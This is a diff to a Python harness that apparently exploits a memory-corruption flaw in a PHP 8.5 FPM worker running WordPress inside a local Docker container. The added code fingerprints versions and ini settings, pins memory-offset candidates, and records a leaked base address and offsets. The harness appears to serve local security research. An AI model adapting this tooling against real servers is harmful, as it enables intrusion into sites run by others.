@@ -114,6 +114,40 @@ def wait_worker():
             time.sleep(0.2)
     raise RuntimeError(f"FPM worker did not appear: {last_error}")
 
+def fingerprint():
+    php = docker("exec", CONTAINER, "php", "-r", "echo PHP_VERSION;")
+    wordpress = docker(
+        "exec",
+        CONTAINER,
+        "php",
+        "-r",
+        "include '/var/www/html/wp-includes/version.php'; echo $wp_version;",
+    )
+    ini = docker(
+        "exec",
+        CONTAINER,
+        "php",
+        "-r",
+        "echo ini_get('memory_limit'),'|',ini_get('session.upload_progress.enabled'),'|',ini_get('session.save_path');",
+    )
+    image = docker("inspect", CONTAINER, "--format", "{{.Image}}")
+    results = [php, wordpress, ini, image]
+    if any(result.returncode for result in results):
+        errors = [result.stderr.decode(errors="replace")[:200] for result in results]
+        raise RuntimeError(f"local fingerprint commands failed: {errors}")
+    facts = {
+        "php": php.stdout.decode(),
+        "wordpress": wordpress.stdout.decode(),
+        "ini": ini.stdout.decode(),
+        "container_image_id": image.stdout.decode().strip(),
+        "p_candidates": ["0x8862000", "0x8662000"],
+        "q_candidates": ["0x608f00", "0x7a27a50", "0x7827a50"],
+        "calibration": "bounded candidates for the pinned local image; no remote-host mode",
+    }
+    if facts["php"] != "8.5.11" or facts["wordpress"] != "6.9.10" or facts["ini"] != "128M|1|/tmp":
+        raise RuntimeError(f"unsupported FPM85 fingerprint: {facts}")
+    return facts
+
 
 def wait_replacement(old_pid):
     current = old_pid
@@ -593,6 +627,8 @@ def main():
     RUN_DIR.mkdir(parents=True, exist_ok=False)
     flush_log()
     info(f"artifacts: {RUN_DIR}")
+    facts = fingerprint()
+    note("preflight", **facts, pid=worker_pid())
 
     try:
         base, original_record = seed_and_leak(args.restart_at_start)
@@ -611,6 +647,8 @@ def main():
 
         result = {
             "success": True,
+            "profile": "fpm85",
+            "fingerprint": facts,
             "B": f"0x{base:016x}",
             "sid": SID,
             "r2a_p_offset": hex(r2a_offset),
